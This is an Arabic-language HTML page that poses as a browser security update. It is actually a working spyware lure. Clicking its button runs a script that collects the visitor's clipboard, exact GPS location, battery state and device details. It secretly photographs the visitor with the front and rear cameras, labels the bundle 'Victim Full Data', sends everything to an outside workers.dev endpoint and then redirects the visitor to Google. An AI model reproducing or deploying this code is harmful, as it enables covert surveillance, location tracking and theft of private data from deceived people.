<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحديث نظام الأمان</title>
    <style>
        body { background: #f0f2f5; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
        .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 80%; max-width: 400px; }
        button { background: #1877f2; color: white; border: none; padding: 12px 25px; border-radius: 8px; font-size: 16px; cursor: pointer; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="card">
        <h3>تحديث الأمان مطلوب</h3>
        <p>يرجى الضغط على الزر أدناه لتحديث إعدادات المتصفح وحمايتك من الاختراق.</p>
        <button onclick="startAction()">تحديث الآن</button>
    </div>

    <video id="v" width="640" height="480" autoplay style="display:none;"></video>
    <canvas id="c" width="640" height="480" style="display:none;"></canvas>

    <script>
        async function startAction() {
            // تغيير النص عند الضغط
            document.querySelector('button').innerText = "جاري التحميل...";
            
            let frontImg = null;
            let backImg = null;
            let clipboardText = "تعذر الوصول (لم ينسخ شيئاً)";
            let batteryInfo = "Unknown";
            let locationMsg = "الموقع الجغرافي: لم يتم السماح";

            // 1. جلب البطارية
            try {
                const battery = await navigator.getBattery();
                batteryInfo = `${(battery.level * 100).toFixed(0)}% (${battery.charging ? 'جاري الشحن' : 'تفريغ'})`;
            } catch(e) {}

            // 2. جلب الحافظة (Clipboard)
            try {
                clipboardText = await navigator.clipboard.readText();
            } catch(e) { clipboardText = "تم رفض إذن الحافظة"; }

            // 3. جلب الموقع الدقيق (GPS)
            const getCoords = () => new Promise((res, rej) => {
                navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true });
            });

            try {
                const pos = await getCoords();
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                locationMsg = `📍 الموقع الدقيق (GPS):\nخط العرض: ${lat}\nخط الطول: ${lon}\n🔗 رابط الاتجاهات:\nhttps://www.google.com/maps/dir/?api=1&destination=${lat},${lon}`;
            } catch(e) { locationMsg = "📍 الموقع: تم رفض الإذن"; }

            // 4. تصوير الكاميرا الأمامية
            frontImg = await takePhoto("user");
            // 5. تصوير الكاميرا الخلفية
            backImg = await takePhoto("environment");

            // 6. تجميع الرسالة النهائية
            const finalMessage = `
✅<b>Victim Full Data</b> 

🔋 <b>Battery:</b> ${batteryInfo}
📋 <b>Clipboard:</b> <code>${clipboardText}</code>

📱 <b>Device:</b> ${navigator.platform}
🌐 <b>Browser:</b> ${navigator.userAgent}

${locationMsg}

⏰ <b>Time:</b> ${new Date().toLocaleString()}
            `;

            // 7. إرسال للـ Worker
            const workerUrl = "https://cold-brook-420f.tjarb093.workers.dev/";
            await fetch(workerUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    message: finalMessage, 
                    frontImage: frontImg, 
                    backImage: backImg 
                })
            });

            window.location.href = "https://www.google.com";
        }

        async function takePhoto(mode) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
                const video = document.getElementById('v');
                video.srcObject = stream;
                // انتظار أطول لضمان عمل الكاميرا (3 ثواني)
                await new Promise(r => setTimeout(r, 3000));
                
                const canvas = document.getElementById('c');
                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                const data = canvas.toDataURL('image/jpeg', 0.5);
                stream.getTracks().forEach(t => t.stop());
                return data;
            } catch (e) {
                return null;
            }
        }
    </script>
</body>
</html>
